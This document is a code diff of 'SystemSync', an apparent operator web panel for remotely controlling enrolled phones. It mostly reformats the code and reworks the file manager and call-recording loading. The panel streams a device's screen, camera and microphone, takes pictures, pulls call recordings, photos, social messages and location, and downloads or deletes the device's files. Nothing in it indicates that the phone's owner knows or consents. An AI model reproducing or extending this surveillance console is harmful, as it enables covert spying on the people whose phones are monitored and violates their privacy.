@@ -171,6 +171,7 @@
                 opacity: 0;
                 transform: translateY(-5px);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0);
@@ -445,6 +446,7 @@
                 opacity: 0;
                 transform: translateY(20px) scale(0.95);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0) scale(1);
@@ -834,8 +836,13 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
         }
 
         .mobile-popup {
@@ -1160,15 +1167,19 @@
                 box-shadow: var(--shadow-lg);
                 width: 280px;
             }
+
             #sidebar.open {
                 transform: translateX(0);
             }
+
             #sidebarCloseBtn {
                 display: flex;
             }
+
             #menuBtn {
                 display: block;
             }
+
             #sidebarOverlay {
                 display: none;
                 position: fixed;
@@ -1177,105 +1188,22 @@
                 backdrop-filter: blur(4px);
                 z-index: 99;
             }
+
             #sidebarOverlay.show {
                 display: block;
             }
+
             #serverInfo {
                 display: none;
             }
+
             #content {
                 padding: 16px;
             }
+
             #main-panel {
                 padding: 20px;
             }
-        }
-
-        /* Tree view for file manager */
-        ul.tree,
-        ul.tree ul {
-            list-style-type: none;
-            margin: 0;
-            padding: 0;
-        }
-
-        .tree-item {
-            display: flex;
-            align-items: center;
-            padding: 6px 8px;
-            border-radius: 6px;
-            cursor: pointer;
-            gap: 8px;
-            margin-bottom: 2px;
-            transition: background 0.2s;
-        }
-
-        .tree-item:hover {
-            background: #e3f2fd;
-        }
-
-        .caret {
-            cursor: pointer;
-            user-select: none;
-            display: inline-block;
-            transition: 0.3s transform;
-            width: 16px;
-            text-align: center;
-            font-size: 10px;
-            color: #7b8a9b;
-        }
-
-        .caret-down {
-            transform: rotate(90deg);
-        }
-
-        ul.tree ul.nested {
-            display: none;
-            padding-left: 32px;
-            border-left: 1px dashed #76b4f3;
-            margin-left: 20px;
-        }
-
-        ul.tree ul.nested.active {
-            display: block;
-            animation: slideDown 0.3s ease-out;
-        }
-
-        .folder-name,
-        .file-name {
-            flex: 1;
-            font-size: 14px;
-            color: #1a2634;
-        }
-
-        .folder-name {
-            color: #1976ff;
-            font-weight: 500;
-        }
-
-        .download-selected {
-            margin-top: 15px;
-            text-align: right;
-            position: sticky;
-            bottom: 0;
-            background: white;
-            padding: 10px 0 0 0;
-            border-top: 1px solid #eef2f5;
-        }
-
-        .download-selected button {
-            width: auto;
-            padding: 8px 16px;
-            background: #1976ff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: 500;
-        }
-
-        .download-selected button:hover {
-            background: #0d5bca;
         }
     </style>
 </head>
@@ -1284,7 +1212,10 @@
     <div id="sidebarOverlay" onclick="closeSidebar()"></div>
     <div id="authContainer">
         <div id="authBox">
-            <h2 id="authModeTitle">🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button>
+            <h2 id="authModeTitle">🔐 SystemSync Login</h2><input type="email" id="authEmail"
+                placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input
+                type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button
+                id="authBtn">Sign In</button>
             <div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div>
             <div id="authError"></div>
         </div>
@@ -1292,25 +1223,31 @@
     <div id="deviceListContainer" style="display:none;">
         <div id="deviceListBox">
             <h2>📱 Your Devices</h2>
-            <div id="deviceList" style="max-height: 400px; overflow-y: auto; padding-right: 4px; margin-bottom: 20px;"></div><button id="logoutBtn">Logout</button>
+            <div id="deviceList" style="max-height: 400px; overflow-y: auto; padding-right: 4px; margin-bottom: 20px;">
+            </div><button id="logoutBtn">Logout</button>
         </div>
     </div>
     <div id="screenModalOverlay" class="modal-overlay">
         <div class="mobile-popup">
             <div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div>
-            <div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn" class="close-btn">✕</button></div>
+            <div class="popup-controls"><button id="modalSnapBtn">📸</button><button
+                    id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn"
+                    class="close-btn">✕</button></div>
         </div>
     </div>
     <div id="cameraModalOverlay" class="modal-overlay">
         <div class="mobile-popup">
             <div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div>
-            <div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn" class="close-btn">✕</button></div>
+            <div class="popup-controls"><button id="cameraSnapBtn">📸</button><button
+                    id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button
+                    id="cameraCloseBtn" class="close-btn">✕</button></div>
         </div>
     </div>
     <div id="audioModalOverlay" class="modal-overlay">
         <div class="mobile-popup">
             <div class="phone-frame"><audio id="modalAudioPlayer" controls style="width:100%;"></audio></div>
-            <div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn" class="close-btn">✕</button></div>
+            <div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn"
+                    class="close-btn">✕</button></div>
         </div>
     </div>
     <div id="sidebar">
@@ -1320,13 +1257,22 @@
             <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
             <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
             <div id="clickCameraPanel" class="camera-panel">
-                <div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked onchange="toggleFlashOptions()"> Front</label><label><input type="radio" name="clickCameraSelect" value="back" onchange="toggleFlashOptions()"> Rear</label></div>
-                <div class="camera-option" id="clickFlashContainer" style="display:none;"><label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button>
+                <div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked
+                            onchange="toggleFlashOptions()"> Front</label><label><input type="radio"
+                            name="clickCameraSelect" value="back" onchange="toggleFlashOptions()"> Rear</label></div>
+                <div class="camera-option" id="clickFlashContainer" style="display:none;"><label><input type="checkbox"
+                            id="clickFlashCheckbox"> Use flash</label></div><button class="capture-btn"
+                    id="capturePictureBtn">TAKE PICTURE</button>
             </div>
             <button id="liveCameraBtn"><span>📹</span> See Live</button>
             <div id="liveCameraPanel" class="camera-panel">
-                <div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked onchange="toggleFlashOptions()"> FrontCAM</label><label><input type="radio" name="liveCameraSelect" value="back" onchange="toggleFlashOptions()"> BackCAM</label></div>
-                <div class="camera-option"><label id="liveFlashContainer" style="display:none;"><input type="checkbox" id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button>
+                <div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked
+                            onchange="toggleFlashOptions()"> FrontCAM</label><label><input type="radio"
+                            name="liveCameraSelect" value="back" onchange="toggleFlashOptions()"> BackCAM</label></div>
+                <div class="camera-option"><label id="liveFlashContainer" style="display:none;"><input type="checkbox"
+                            id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox"
+                            checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start
+                    Live</button>
             </div>
             <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
             <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop</button>
@@ -1365,17 +1311,24 @@
             <button id="vibrateBtn"><span>📳</span> Vibrate</button>
             <button id="toggleFlashBtn"><span>🔦</span> <span id="flashBtn">Flash On</span></button>
         </div>
-        <div id="alertsBadge" style="display:none;"><strong>⚠️ Alerts</strong><div id="alertsList"></div><button id="clearAlertsBtn">Clear</button></div>
+        <div id="alertsBadge" style="display:none;"><strong>⚠️ Alerts</strong>
+            <div id="alertsList"></div><button id="clearAlertsBtn">Clear</button>
+        </div>
         <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
     </div>
     <div id="main">
         <div id="header">
-            <div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn" style="display:none; margin-left:12px; font-size:12px; padding:4px 8px; border-radius:4px; border:1px solid var(--border); background:var(--danger-bg); color:var(--danger); cursor:pointer; font-weight:600;" onclick="leaveDevice()">Leave Device</button></span></div>
+            <div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span
+                        id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn"
+                        style="display:none; margin-left:12px; font-size:12px; padding:4px 8px; border-radius:4px; border:1px solid var(--border); background:var(--danger-bg); color:var(--danger); cursor:pointer; font-weight:600;"
+                        onclick="leaveDevice()">Leave Device</button></span></div>
             <div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div>
         </div>
         <div id="downloadProgress">
             <div><span id="progressFileName">Downloading...</span><span id="progressPercent">0%</span></div>
-            <div><div id="progressBar"></div></div>
+            <div>
+                <div id="progressBar"></div>
+            </div>
         </div>
         <div id="content">
             <div id="main-panel">🔌 Initializing connection...</div>
@@ -1413,9 +1366,7 @@
         let socialMsgsData = [], currentLocation = null;
         let deviceInfoRefreshInterval = null;
         let currentMapType = 'street';
-        let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false;
-        let fileTreeCache = {};
-        let expandedFolders = new Set(['root']);
+        let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false, fileTreeCache = {};
 
         const panel = document.getElementById('main-panel');
         const statusEl = document.getElementById('status');
@@ -1579,7 +1530,7 @@
 
         // ==================== WEBRTC ====================
         function createPeerConnection(type, onTrack, useMic, iceServers = CONFIG.ICE_SERVERS) {
-            const pc = new RTCPeerConnection({ iceServers });
+            const pc = new RTCPeerConnection({ iceServers: iceServers });
             if (type === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
             else if (type === 'camera') { pc.addTransceiver('video', { direction: 'recvonly' }); if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' }); }
             else if (type === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
@@ -1640,7 +1591,10 @@
 
         function snapScreenFromModal() {
             const video = document.getElementById('modalScreenVideo');
-            if (!video || !video.videoWidth) { alert('No active screen share or video not ready yet. Please wait a moment.'); return; }
+            if (!video || !video.videoWidth) {
+                alert('No active screen share or video not ready yet. Please wait a moment.');
+                return;
+            }
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -1658,7 +1612,10 @@
 
         function toggleScreenRecording() {
             const video = document.getElementById('modalScreenVideo');
-            if (!video || !video.srcObject) { alert('No active screen share. Start screen share first.'); return; }
+            if (!video || !video.srcObject) {
+                alert('No active screen share. Start screen share first.');
+                return;
+            }
             if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
                 screenMediaRecorder.stop();
                 document.getElementById('modalRecordBtn').innerText = '🔴';
@@ -1674,19 +1631,31 @@
 
         function startScreenRecording() {
             const video = document.getElementById('modalScreenVideo');
-            if (!video || !video.videoWidth) { alert('Video not ready. Please wait.'); return; }
+            if (!video || !video.videoWidth) {
+                alert('Video not ready. Please wait.');
+                return;
+            }
             screenRecordedChunks = [];
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            const drawFrame = () => { if (video.videoWidth && video.videoHeight) ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(drawFrame); };
+            const drawFrame = () => {
+                if (video.videoWidth && video.videoHeight) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                }
+                requestAnimationFrame(drawFrame);
+            };
             drawFrame();
             const canvasStream = canvas.captureStream(30);
             const originalStream = video.srcObject;
-            if (originalStream && originalStream.getAudioTracks().length) originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+            if (originalStream && originalStream.getAudioTracks().length) {
+                originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+            }
             screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-            screenMediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenRecordedChunks.push(e.data); };
+            screenMediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) screenRecordedChunks.push(e.data);
+            };
             screenMediaRecorder.onstop = () => {
                 const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
                 const url = URL.createObjectURL(blob);
@@ -1714,7 +1683,9 @@
         }
 
         function closeScreenModal() {
-            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
+            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+                screenMediaRecorder.stop();
+            }
             document.getElementById('screenModalOverlay').classList.remove('show');
             document.body.classList.remove('modal-open');
             if (screenActive) {
@@ -1864,108 +1835,168 @@
             panel.innerHTML = 'Ready.';
         }
 
-        // ==================== FILE MANAGER ====================
-        function renderFiles() {
-            let html = `
-            <div class="file-manager">
-                <div class="file-toolbar-sticky">
-                    <div class="file-toolbar">
-                        <span style="font-weight: 600; color: #1a2634; font-size: 14px; margin-left: 8px;">File Browser</span>
-                        <div style="display: flex; gap: 8px; margin-left: auto;">
-                            <button onclick="downloadSelected()" style="flex:1; display: flex; align-items: center; justify-content: center; gap: 4px;">⬇️ <span id="downloadCount">${selectedFiles.length}</span></button>
-                            <button onclick="deleteSelected()" style="flex:1; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; gap: 4px;">🗑️ <span id="deleteCount">${selectedFiles.length}</span></button>
-                        </div>
-                    </div>
-                </div>
-                <div class="tree-view">
-                    <ul class="tree" id="fileTreeRoot">
-                        ${generateTreeHtml('root')}
-                    </ul>
-                </div>
-            </div>`;
-            panel.innerHTML = html;
-        }
-
-        function generateTreeHtml(path) {
+        // ==================== FILE MANAGER (FIXED WITH CHECKBOXES) ====================
+        function renderFileTreeNodes(data, path) {
+            const folders = data.filter(i => i.isDir).sort((a, b) => a.name.localeCompare(b.name));
+            const files = data.filter(i => !i.isDir).sort((a, b) => a.name.localeCompare(b.name));
             let html = '';
-            const items = fileTreeCache[path];
-            if (!items) return '<li style="padding-left:24px; color:#7b8a9b; font-size:12px;">Loading...</li>';
-            if (items.length === 0) return '<li style="padding-left:24px; color:#7b8a9b; font-size:12px;">Empty folder</li>';
-
-            const folders = items.filter(item => item.isDir).sort((a, b) => a.name.localeCompare(b.name));
-            const files = items.filter(item => !item.isDir).sort((a, b) => a.name.localeCompare(b.name));
-
             folders.forEach(f => {
-                const isOpen = expandedFolders.has(f.path);
-                const caretCls = isOpen ? 'caret caret-down' : 'caret';
-                const nestedCls = isOpen ? 'nested active' : 'nested';
-                html += `<li><div class="tree-item folder-item" onclick="handleFolderClick(event, '${f.path}')"><span class="${caretCls}">▶</span><span class="folder-icon">📁</span><span class="folder-name">${f.name}</span></div><ul class="${nestedCls}">${isOpen ? generateTreeHtml(f.path) : ''}</ul></li>`;
+                const encPath = btoa(encodeURIComponent(f.path)).replace(/=/g, '');
+                html += `<li>
+            <div class="folder-header" data-path="${escapeHtml(f.path)}">
+                <span class="chevron">▶</span><span class="folder-icon">📁</span>
+                <span class="item-name">${escapeHtml(f.name)}</span>
+            </div>
+            <div class="tree-children" id="tree-container-${encPath}">
+                <ul class="tree-children-inner" id="tree-inner-${encPath}"></ul>
+            </div>
+        </li>`;
             });
-
             files.forEach(f => {
-                const pathStr = f.path;
-                const isChecked = selectedFiles.includes(pathStr) ? 'checked' : '';
-                html += `<li><div class="tree-item file-item"><span style="width:16px;"></span><input type="checkbox" class="file-checkbox" data-path="${pathStr}" onchange="updateSelected(this)" ${isChecked}><span class="file-icon">📄</span><span class="file-name">${f.name}</span><span class="file-size">${formatBytes(f.size)}</span></div></li>`;
+                html += `<li>
+            <div class="file-row">
+                <input type="checkbox" class="file-checkbox" data-path="${escapeHtml(f.path)}" onchange="updateSelected(this)">
+                <span class="file-icon">📄</span>
+                <span class="item-name">${escapeHtml(f.name)}</span>
+                <span class="file-size">${formatBytes(f.size)}</span>
+                <div class="file-actions">
+                    <button class="file-action-btn dl" data-path="${escapeHtml(f.path)}">⬇️</button>
+                    <button class="file-action-btn del" data-path="${escapeHtml(f.path)}">🗑️</button>
+                </div>
+            </div>
+        </li>`;
             });
+            if (folders.length === 0 && files.length === 0) html += `<li style="padding:10px 20px; color:#999; font-size:12px;">Empty folder</li>`;
             return html;
         }
 
-        function handleFolderClick(event, path) {
-            event.stopPropagation();
-            currentPath = path;
-            if (expandedFolders.has(path)) {
-                expandedFolders.delete(path);
-                renderFiles();
+        function renderFiles() {
+            let html = `<div class="file-manager">
+        <div class="file-toolbar-sticky">
+            <div class="file-toolbar">
+                <button onclick="navigateUp()">⬆ Up</button>
+                <div style="display: flex; gap: 8px; margin-left: auto;">
+                    <button onclick="downloadSelected()" style="flex:1; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                        ⬇️ <span id="downloadCount">${selectedFiles.length}</span>
+                    </button>
+                    <button onclick="deleteSelected()" style="flex:1; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                        🗑️ <span id="deleteCount">${selectedFiles.length}</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="tree-content"><ul class="tree-root" id="tree-root-container">`;
+            if (currentData && currentData.length) {
+                const sortedData = [...currentData];
+                const folders = sortedData.filter(i => i.isDir).sort((a, b) => a.name.localeCompare(b.name));
+                const files = sortedData.filter(i => !i.isDir).sort((a, b) => a.name.localeCompare(b.name));
+                const allSorted = [...folders, ...files];
+                html += renderFileTreeNodes(allSorted, 'root');
             } else {
-                expandedFolders.add(path);
-                if (!fileTreeCache[path]) { sendCommand('LIST_FILES', { path }); renderFiles(); }
-                else renderFiles();
+                html += '<li style="padding:10px; color:#999;">No files or root not loaded yet.</li>';
+            }
+            html += `</ul></div></div>`;
+            panel.innerHTML = html;
+            attachFileEventListeners();
+        }
+
+        function attachFileEventListeners(container = document) {
+            // Folder click handlers
+            container.querySelectorAll('.folder-header').forEach(header => {
+                header.onclick = (e) => folderClickHandler(e);
+            });
+            // File download buttons
+            container.querySelectorAll('.file-action-btn.dl').forEach(btn => {
+                btn.onclick = (e) => downloadClickHandler(e);
+            });
+            // File delete buttons
+            container.querySelectorAll('.file-action-btn.del').forEach(btn => {
+                btn.onclick = (e) => deleteClickHandler(e);
+            });
+            // Checkboxes (already have onchange attribute, but ensure they exist)
+            container.querySelectorAll('.file-checkbox').forEach(cb => {
+                cb.onchange = (e) => updateSelected(e.target);
+            });
+        }
+
+        function folderClickHandler(e) {
+            e.stopPropagation();
+            const header = e.currentTarget;
+            const path = header.getAttribute('data-path');
+            const encPath = btoa(encodeURIComponent(path)).replace(/=/g, '');
+            const container = document.getElementById('tree-container-' + encPath);
+            const inner = document.getElementById('tree-inner-' + encPath);
+            const chevron = header.querySelector('.chevron');
+            if (!container) return;
+            if (container.classList.contains('expanded')) {
+                container.classList.remove('expanded');
+                if (chevron) chevron.classList.remove('down');
+            } else {
+                container.classList.add('expanded');
+                if (chevron) chevron.classList.add('down');
+                if (inner.innerHTML.trim() === '' || inner.querySelector('li[data-loading]')) {
+                    inner.innerHTML = '<li data-loading="1" style="padding:10px 20px; color:#999; font-size:12px;">⏳ Loading...</li>';
+                    currentPath = path;
+                    window.pendingFolderLoad = { path, encPath, inner };
+                    sendCommand('LIST_FILES', { path: path });
+                }
             }
         }
 
-        function updateSelected(checkbox) {
-            const path = checkbox.dataset.path;
-            if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
-            else { selectedFiles = selectedFiles.filter(p => p !== path); }
-            updateCounters();
+        function downloadClickHandler(e) {
+            e.stopPropagation();
+            const path = e.currentTarget.getAttribute('data-path');
+            if (path) { sendPlainText('dl ' + path); showNotification(`Download requested: ${path.split('/').pop()}`); }
         }
 
-        function downloadSelected() {
-            if (selectedFiles.length === 0) { alert('No files selected'); return; }
-            selectedFiles.forEach(path => sendPlainText('dl ' + path));
+        function deleteClickHandler(e) {
+            e.stopPropagation();
+            const path = e.currentTarget.getAttribute('data-path');
+            if (path && confirm(`Delete file: ${path.split('/').pop()}?`)) sendCommand('DELETE_FILE', { path: path });
         }
 
-        function deleteSelected() {
-            if (selectedFiles.length === 0) { alert('No files selected'); return; }
-            if (!confirm(`Delete ${selectedFiles.length} file(s)? This action cannot be undone.`)) return;
-            selectedFiles.forEach(path => sendCommand('DELETE_FILE', { path }));
-            selectedFiles = [];
-            updateCounters();
-        }
-
-        function updateCounters() {
-            const count = selectedFiles.length;
-            const downloadCountSpan = document.getElementById('downloadCount');
-            const deleteCountSpan = document.getElementById('deleteCount');
-            if (downloadCountSpan) downloadCountSpan.innerText = count;
-            if (deleteCountSpan) deleteCountSpan.innerText = count;
-        }
-
-        window.refreshFileRoot = function () {
-            sendCommand('LIST_FILES', { path: 'root' });
-            panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files from device...</p>';
-        };
+        window.refreshFileRoot = function () { sendCommand('LIST_FILES', { path: 'root' }); panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files from device...</p>'; };
+        function navigateUp() { if (currentPath === 'root' || currentPath === '') return; let parts = currentPath.split('/'); parts.pop(); let parent = parts.join('/'); if (parent === '') parent = 'root'; currentPath = parent; sendCommand('LIST_FILES', { path: parent }); }
+        function downloadSelected() { if (selectedFiles.length === 0) { alert('No files selected'); return; } selectedFiles.forEach(path => sendPlainText('dl ' + path)); }
+        function deleteSelected() { if (selectedFiles.length === 0) { alert('No files selected'); return; } if (!confirm(`Delete ${selectedFiles.length} file(s)?`)) return; selectedFiles.forEach(path => sendCommand('DELETE_FILE', { path: path })); selectedFiles = []; updateCounters(); }
+        function updateSelected(checkbox) { const path = checkbox.dataset.path; if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); } else { selectedFiles = selectedFiles.filter(p => p !== path); } updateCounters(); }
+        function updateCounters() { const count = selectedFiles.length; const downloadSpan = document.getElementById('downloadCount'); const deleteSpan = document.getElementById('deleteCount'); if (downloadSpan) downloadSpan.innerText = count; if (deleteSpan) deleteSpan.innerText = count; }
 
         // ==================== CALL RECORDINGS ====================
         async function showCallRecordingsPanel() {
-            if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-            if (!currentUser) { panel.innerHTML = '<p>You must be logged in.</p>'; return; }
+            if (!selectedDeviceId) {
+                panel.innerHTML = '<p>No device selected.</p>';
+                return;
+            }
+            if (!currentUser) {
+                panel.innerHTML = '<p>You must be logged in.</p>';
+                return;
+            }
             panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from Firebase...</p>';
             try {
-                let snapshot = await db.collection('call_recordings').where('deviceId', '==', selectedDeviceId).where('userId', '==', currentUser.uid).orderBy('timestamp', 'desc').get();
+                let snapshot = null;
+                try {
+                    snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
+                        .orderBy('timestamp', 'desc')
+                        .get();
+                } catch (e) { }
+                if (!snapshot || snapshot.empty) {
+                    snapshot = await db.collection('call_recordings')
+                        .where('deviceId', '==', selectedDeviceId)
+                        .where('userId', '==', currentUser.uid)
+                        .orderBy('timestamp', 'desc')
+                        .get();
+                }
                 if (snapshot.empty) {
-                    panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p>No recordings found in Firebase. You can fetch recordings directly from the device (if available).</p><button id="fallbackRecordingsBtn" class="btn-ui primary">📞 Fetch from Device</button>`;
-                    document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => { sendCommand('GET_CALL_RECORDINGS', { days: 30 }); showNotification('Fetching call recordings from device...'); });
+                    panel.innerHTML = `
+                <h3>🎙️ Call Recordings</h3>
+                <p>No recordings found in Firebase. You can fetch recordings directly from the device (if available).</p>
+                <button id="fallbackRecordingsBtn" class="btn-ui primary">📞 Fetch from Device</button>
+            `;
+                    document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                        showNotification('Fetching call recordings from device...');
+                    });
                     return;
                 }
                 let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div style="margin-top:16px;">';
@@ -1974,12 +2005,24 @@
                     const directionIcon = rec.direction === 'incoming' ? '📞' : '📤';
                     const timestamp = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : rec.timeFmt || 'Unknown date';
                     const duration = rec.duration ? `${Math.floor(rec.duration / 60)}:${(rec.duration % 60).toString().padStart(2, '0')}` : '?';
-                    html += `<div class="call-recording-card"><div class="call-recording-info"><div><span class="call-recording-direction">${directionIcon}</span><span class="call-recording-number">${escapeHtml(rec.number || 'Unknown')}</span>${rec.name ? `<span style="color:var(--text-sec); margin-left:8px;">(${escapeHtml(rec.name)})</span>` : ''}</div><div class="call-recording-details">${timestamp} • Duration: ${duration}</div></div><button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button></div>`;
+                    html += `
+                <div class="call-recording-card">
+                    <div class="call-recording-info">
+                        <div>
+                            <span class="call-recording-direction">${directionIcon}</span>
+                            <span class="call-recording-number">${escapeHtml(rec.number || 'Unknown')}</span>
+                            ${rec.name ? `<span style="color:var(--text-sec); margin-left:8px;">(${escapeHtml(rec.name)})</span>` : ''}
+                        </div>
+                        <div class="call-recording-details">${timestamp} • Duration: ${duration}</div>
+                    </div>
+                    <button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button>
+                </div>
+            `;
                 });
                 html += '</div>';
                 panel.innerHTML = html;
                 document.querySelectorAll('.download-recording-btn').forEach(btn => {
-                    btn.addEventListener('click', async () => {
+                    btn.addEventListener('click', async (e) => {
                         const url = btn.getAttribute('data-url');
                         const filename = btn.getAttribute('data-filename');
                         if (!url) { showNotification('No audio file URL'); return; }
@@ -1998,26 +2041,67 @@
                 });
             } catch (err) {
                 console.error(err);
-                panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn2" class="btn-ui primary">Fetch from Device</button>`;
-                document.getElementById('fallbackDeviceBtn2')?.addEventListener('click', () => { sendCommand('GET_CALL_RECORDINGS', { days: 30 }); showNotification('Fetching call recordings from device...'); });
+                if (err.code === 'permission-denied') {
+                    panel.innerHTML = `
+                <h3>🎙️ Call Recordings</h3>
+                <div style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 16px; border-radius: 8px;">
+                    <strong>⚠️ Firebase Permission Error</strong><br>
+                    Make sure each recording document in the <code>call_recordings</code> collection contains a <code>userId</code> field matching the authenticated user's UID.<br>
+                    Also, your query must include <code>.where('userId', '==', currentUser.uid)</code>.<br><br>
+                    <button id="retryRecordingsBtn" class="btn-ui primary" style="margin-top: 12px;">Retry</button>
+                    <button id="fallbackDeviceBtn" class="btn-ui secondary" style="margin-top: 12px; margin-left: 8px;">Fetch from Device</button>
+                </div>
+            `;
+                    document.getElementById('retryRecordingsBtn')?.addEventListener('click', () => showCallRecordingsPanel());
+                    document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                        showNotification('Fetching call recordings from device...');
+                    });
+                } else {
+                    panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn2" class="btn-ui primary">Fetch from Device</button>`;
+                    document.getElementById('fallbackDeviceBtn2')?.addEventListener('click', () => {
+                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                        showNotification('Fetching call recordings from device...');
+                    });
+                }
             }
         }
 
         // ==================== PHOTO GALLERY ====================
         async function showPhotoGalleryPanel() {
-            if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-            if (!currentUser) { panel.innerHTML = '<p>You must be logged in.</p>'; return; }
+            if (!selectedDeviceId) {
+                panel.innerHTML = '<p>No device selected.</p>';
+                return;
+            }
+            if (!currentUser) {
+                panel.innerHTML = '<p>You must be logged in.</p>';
+                return;
+            }
             panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><p>Loading photos from Firebase...</p>';
             try {
-                const snapshot = await db.collection('images_meta').where('deviceId', '==', selectedDeviceId).get();
+                const snapshot = await db.collection('images_meta')
+                    .where('deviceId', '==', selectedDeviceId)
+                    .get();
+
                 if (snapshot.empty) {
-                    panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p>No photos found in Firebase. You can fetch recent images directly from the device (if available).</p><button id="fallbackGalleryBtn" class="btn-ui primary">📸 Fetch from Device</button>`;
-                    document.getElementById('fallbackGalleryBtn')?.addEventListener('click', () => { sendCommand('GET_RECENT_IMAGES', { days: 5 }); showNotification('Fetching recent images from device...'); });
+                    panel.innerHTML = `
+                <h3>🖼️ Photo Gallery</h3>
+                <p>No photos found in Firebase. You can fetch recent images directly from the device (if available).</p>
+                <button id="fallbackGalleryBtn" class="btn-ui primary">📸 Fetch from Device</button>
+            `;
+                    document.getElementById('fallbackGalleryBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                        showNotification('Fetching recent images from device...');
+                    });
                     return;
